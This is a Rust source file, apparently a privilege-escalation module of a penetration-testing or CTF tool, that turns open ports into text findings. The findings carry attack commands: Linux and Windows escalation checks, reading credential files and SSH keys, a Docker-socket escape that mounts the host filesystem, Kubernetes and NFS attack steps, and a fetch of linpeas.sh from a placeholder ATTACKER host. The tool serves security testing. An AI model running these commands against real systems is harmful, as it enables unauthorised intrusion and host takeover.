use crate::core::findings::{Finding, Severity};
use crate::core::workflow::WorkflowMode;
use crate::modules::Module;
use async_trait::async_trait;
use tokio::sync::mpsc::Sender;

pub struct PrivEsc;

#[async_trait]
impl Module for PrivEsc {
    fn name(&self) -> &str {
        "Privilege Escalation"
    }

    async fn execute_with_ports(&self, target: &str, open_ports: &[u16], mode: &WorkflowMode, tx: Sender<String>) -> Result<Vec<Finding>, anyhow::Error> {
        let _ = tx.send("[PrivEsc] Generating privilege escalation strategy...".into()).await;
        let mut findings = Vec::new();
        let is_ctf = matches!(mode, WorkflowMode::Ctf);

        // Linux PE check (SSH or web + Linux-like services)
        let has_linux_signals = open_ports.iter().any(|p| [22, 80, 443, 8080, 8443, 8000].contains(p));

        if has_linux_signals {
            let _ = tx.send("[PrivEsc] Checking Linux privilege escalation vectors...".into()).await;

            findings.push(
                Finding::new(target, "priv_esc", "Linux PE: Enumeration Strategy",
                    "Common Linux privilege escalation checks: \
                     1. Kernel exploits (uname -a, search for CVE) \
                     2. SUID binaries (find / -perm -4000 2>/dev/null) \
                     3. Sudo -l (check sudo permissions) \
                     4. Writable /etc/passwd or /etc/shadow \
                     5. Cron jobs (cat /etc/crontab, ls -la /etc/cron*) \
                     6. Writable scripts executed by cron/root \
                     7. Docker group membership (/var/run/docker.sock) \
                     8. Linux capabilities (getcap -r / 2>/dev/null) \
                     9. NFS root squashing (showmount -e, mount with no_root_squash) \
                     10. LXD/LXC group membership for container escape",
                    Severity::High,
                ).with_confidence(0.8)
                .with_evidence(vec!["SSH, HTTP, or HTTPS detected on target".into()]),
            );

            if is_ctf {
                findings.push(
                    Finding::new(target, "priv_esc", "CTF: Quick Linux PE Commands",
                        "Quick CTF privilege escalation enumeration commands:\n\
                         `linpeas.sh | tee pe.txt` - LinPEAS automated scan\n\
                         `sudo -l` - Check sudo permissions\n\
                         `find / -type f -perm -4000 2>/dev/null` - SUID binaries\n\
                         `cat /etc/crontab && ls -la /etc/cron*` - Cron jobs\n\
                         `cat /etc/passwd | grep -v /nologin` - Users with shells\n\
                         `ls -la /home/*/.ssh/` - SSH keys\n\
                         `ps aux | grep root` - Running processes as root\n\
                         `cat ~/.bash_history ~/.bashrc ~/.profile 2>/dev/null` - User configs\n\
                         `wget http://ATTACKER/linpeas.sh || curl -O http://ATTACKER/linpeas.sh`",
                        Severity::Info,
                    ).with_confidence(0.9),
                );

                // Windows PE (SMB + WinRM signals)
                if open_ports.contains(&445) || open_ports.contains(&5985) || open_ports.contains(&5986) {
                    findings.push(
                        Finding::new(target, "priv_esc", "CTF: Windows PE Strategy",
                            "Windows privilege escalation checklist:\n\
                             1. `whoami /all` - Token privileges (SeImpersonate, SeAssignPrimaryToken)\n\
                             2. `systeminfo` | findstr /B /C:\"OS\" - Kernel version\n\
                             3. `wmic product get name` - Installed software\n\
                             4. `accesschk.exe -uwcqv \"Authenticated Users\" *` - Service permissions\n\
                             5. `icacls C:\\Program Files\\*` - Weak file permissions\n\
                             6. `reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall` - Installed apps\n\
                             7. `net localgroup administrators` - Admin group members\n\
                             8. `schtasks /query /fo LIST /v` - Scheduled tasks\n\
                             9. `winpeas.exe` - WinPEAS automated scan\n\
                             10. `Invoke-AllChecks` - PowerUp.ps1",
                            Severity::High,
                        ).with_confidence(0.8)
                        .with_evidence(vec!["SMB or WinRM detected on target".into()]),
                    );
                }
            }
        }

        // Docker detection
        if open_ports.contains(&2375) || open_ports.contains(&2376) {
            let _ = tx.send("[PrivEsc] Docker socket detected! Potential container escape.".into()).await;
            findings.push(
                Finding::new(target, "priv_esc", "Docker Container Escape",
                    "Docker socket exposed on TCP. This is a CRITICAL finding:\n\
                     1. List containers: `docker -H tcp://TARGET:2375 ps`\n\
                     2. Execute in container: `docker -H tcp://TARGET:2375 exec -it CONTAINER sh`\n\
                     3. Mount host filesystem: `docker -H tcp://TARGET:2375 run -v /:/mnt -it alpine chroot /mnt sh`\n\
                     4. Full host compromise!",
                    Severity::Critical,
                ).with_confidence(0.95)
                .with_evidence(vec!["Docker TCP API port is open".into()]),
            );
        }

        // Kubernetes detection
        if open_ports.contains(&6443) || open_ports.contains(&10250) {
            let _ = tx.send("[PrivEsc] Kubernetes API detected".into()).await;
            findings.push(
                Finding::new(target, "priv_esc", "Kubernetes API Access",
                    "Kubernetes API server detected. Common attacks:\n\
                     1. Unauthenticated API: `kubectl --insecure-skip-tls-verify -s https://TARGET:6443 get pods`\n\
                     2. Kubelet API: `curl -k https://TARGET:10250/pods`\n\
                     3. Service account tokens in pods\n\
                     4. Dashboard endpoint",
                    Severity::Critical,
                ).with_confidence(0.8)
                .with_evidence(vec![format!("Kubernetes port 6443 or 10250 detected")]),
            );
        }

        // NFS detection
        if open_ports.contains(&2049) {
            let _ = tx.send("[PrivEsc] NFS share detected, checking for root squashing".into()).await;
            findings.push(
                Finding::new(target, "priv_esc", "NFS Root Squashing Check",
                    "NFS on 2049. If 'root_squash' is disabled, you can write as root:\n\
                     `showmount -e TARGET`\n\
                     `mount -t nfs TARGET:/share /mnt/nfs`\n\
                     If no_root_squash: write files as UID 0 for privilege escalation",
                    Severity::High,
                ).with_confidence(0.7)
                .with_evidence(vec!["NFS port 2049 detected".into()]),
            );
        }

        if findings.is_empty() {
            let _ = tx.send("[PrivEsc] No clear privilege escalation targets detected from open ports".into()).await;
            findings.push(
                Finding::new(target, "priv_esc", "PE: Manual Check Required",
                    "No automated privilege escalation targets identified. Manual enumeration recommended:\n\
                     Enumerate users, running services, file permissions, and system configuration.",
                    Severity::Info,
                ).with_confidence(0.5),
            );
        }

        let _ = tx.send(format!("[PrivEsc] Privilege escalation analysis complete. {} findings.", findings.len())).await;
        Ok(findings)
    }

}
